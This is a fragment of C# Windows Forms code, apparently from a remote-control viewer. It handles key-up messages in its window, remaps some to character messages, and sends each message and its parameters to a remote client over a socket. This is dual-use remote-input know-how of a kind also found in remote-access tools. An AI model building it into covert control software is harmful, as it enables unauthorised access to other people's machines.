                case 0x0101: // WM_KEYUP
                    msg = (uint)m.Msg;
                    wParam = m.WParam;
                    lParam = m.LParam;

                    // Check if the Shift or Caps Lock key is pressed
                    bool isShiftPressed = (GetKeyState((int)Keys.ShiftKey) & 0x8000) != 0;
                    bool isCapsLockOn = Control.IsKeyLocked(Keys.CapsLock);
                    if (isShiftPressed || isCapsLockOn)
                    {
                        // Modify the wParam to include the SHIFT or CAPSLOCK flag
                        const int VK_SHIFT = 0x10;
                        const int VK_CAPITAL = 0x14;

                        if (wParam.ToInt32() == VK_SHIFT || wParam.ToInt32() == VK_CAPITAL)
                        {
                            // Skip processing SHIFT or CAPSLOCK key release
                            break;
                        }

                        if (isShiftPressed)
                        {
                            msg = 0x0102;
                            uint scanCode = (uint)((lParam.ToInt32() >> 16) & 0xFF);
                            byte[] keyboardState = new byte[256];
                            ToAscii((uint)wParam.ToInt32(), scanCode, keyboardState, out uint charCode, 0);
                            wParam = (IntPtr)Convert.ToInt32(GetModifiedKey((char)charCode));
                        }

                        if (isCapsLockOn)
                        {
                            uint scanCode = (uint)((lParam.ToInt32() >> 16) & 0xFF);
                            byte[] keyboardState = new byte[256];
                            ToAscii((uint)wParam.ToInt32(), scanCode, keyboardState, out uint charCode, 0);
                            if (IsAlphaNumeric((char)charCode))
                            {
                                msg = 0x0102;
                            }
                        }
                    }
                    Imsg = (int)msg;
                    IwParam = (int)wParam;
                    IlParam = (int)lParam;
                    Task.Run(async () =>
                    {
                        payload = client.sock.Concat(new byte[] { 3 }, client.sock.IntToBytes(Imsg));
                        payload = client.sock.Concat(payload, client.sock.IntToBytes(IwParam));
                        payload = client.sock.Concat(payload, client.sock.IntToBytes(IlParam));
                        await client.SendAsync(payload);
                    }).Wait();
                    break;
            }
            base.WndProc(ref m);
        }

    }
}
